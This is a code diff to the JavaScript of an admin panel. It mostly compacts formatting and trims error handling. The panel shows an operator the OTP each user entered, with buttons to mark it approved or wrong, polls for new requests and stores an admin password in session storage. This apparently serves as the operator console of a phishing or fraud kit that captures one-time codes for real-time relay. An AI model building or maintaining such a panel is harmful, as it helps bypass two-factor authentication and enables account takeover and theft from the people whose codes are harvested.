@@ -79,14 +79,8 @@ async function load() {
 }
 
 async function act(fn) {
-  try { 
-    await fn(); 
-    await load(); 
-    draw(); 
-  } catch (x) { 
-    console.error('Action error:', x);
-    alert('Action failed (' + x.message + '). Please check connectivity.'); 
-  }
+  try { await fn(); await load(); draw(); }
+  catch (x) { alert('Action failed (' + x.message + ').'); }
 }
 
 const users = () => DATA;
@@ -133,7 +127,7 @@ function draw() {
         <div class="up" style="background:var(--tint);padding:14px;border-radius:12px;border:1.5px solid var(--ln);width:100%">
           <b>Verification Control Actions</b>
           <div style="display:flex;gap:20px;margin:10px 0;align-items:center;flex-wrap:wrap">
-            <div><small style="color:var(--mut);font-weight:700">User Entered OTP:</small> <b style="font-size:1.25rem;color:var(--ac);margin-left:6px;background:#fff;padding:2px 10px;border-radius:6px;border:1px solid var(--ln);">${esc(userEnteredOtp)}</b></div>
+            <div><small style="color:var(--mut);font-weight:700">User Entered OTP:</small> <b style="font-size:1.2rem;color:var(--ac);margin-left:6px">${esc(userEnteredOtp)}</b></div>
           </div>
           <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:8px">
             <button class="btn s" type="button" data-otp-correct="${esc(k)}">✅ Approve (Success)</button>
@@ -183,15 +177,9 @@ document.addEventListener('click', async e => {
   if (correctBtn) {
     const id = correctBtn.dataset.otpCorrect;
     await act(async () => {
-      try {
-        await api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/status`, { body: { s: 'success' } });
-      } catch (err) {}
+      try { await api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/status`, { body: { s: 'success' } }); } catch(e){}
       await api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/remark`, {
-        body: { 
-          s: 'success',
-          data: { otp_status: 'verified' },
-          remark: 'OTP Verified & Request Approved'
-        }
+        body: { s: 'success', data: { otp_status: 'verified' }, remark: 'OTP Verified & Request Approved' }
       });
     });
     return;
@@ -201,15 +189,9 @@ document.addEventListener('click', async e => {
   if (wrongBtn) {
     const id = wrongBtn.dataset.otpWrong;
     await act(async () => {
-      try {
-        await api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/status`, { body: { s: 'failed' } });
-      } catch (err) {}
+      try { await api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/status`, { body: { s: 'failed' } }); } catch(e){}
       await api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/remark`, {
-        body: { 
-          s: 'failed',
-          data: { otp_status: 'wrong' }, 
-          remark: 'Incorrect OTP' 
-        }
+        body: { s: 'failed', data: { otp_status: 'wrong' }, remark: 'Incorrect OTP' }
       });
     });
     return;
@@ -247,7 +229,7 @@ setInterval(async () => {
 }, REFRESH_MS);
 
 (async () => {
-  const p = sessionStorage.sessionItem ? sessionStorage.getItem('ds_admin_pass') : sessionStorage.getItem('ds_admin_pass');
+  const p = sessionStorage.getItem('ds_admin_pass');
   if (p) { PASS = p; try { await load(); $('#gate').hidden = true; $('#main').hidden = false; $('#out').hidden = false; draw(); } catch { PASS = ''; } }
 })();
 </script>
